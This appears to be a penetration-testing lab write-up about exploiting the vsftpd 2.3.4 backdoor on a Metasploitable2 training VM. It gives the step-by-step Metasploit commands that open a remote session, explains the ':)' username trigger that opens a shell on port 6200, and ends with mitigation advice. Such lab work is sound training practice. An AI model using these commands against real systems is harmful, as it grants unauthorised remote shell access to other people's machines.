# Exploit 1: vsftpd 2.3.4 Backdoor

**Target:** Metasploitable2, 192.168.56.101, FTP port 21
**Severity:** Critical

## Steps
1. Search for the module: `search vsftpd`
2. Load the exploit: `use exploit/unix/ftp/vsftpd_234_backdoor`
3. Set the target: `set RHOSTS 192.168.56.101`
4. Set the attacker address: `set LHOST 192.168.56.10`
5. Run it: `exploit`

Result: a Meterpreter session opened on the target.

## Why It Works
The vsftpd 2.3.4 release shipped with a backdoor. Logging in with a username ending in `:)` opens a shell on port 6200 with no password required.

## Mitigation
- Remove vsftpd 2.3.4 and install a current, supported FTP server, or disable FTP entirely.
- Verify the installed version after patching.
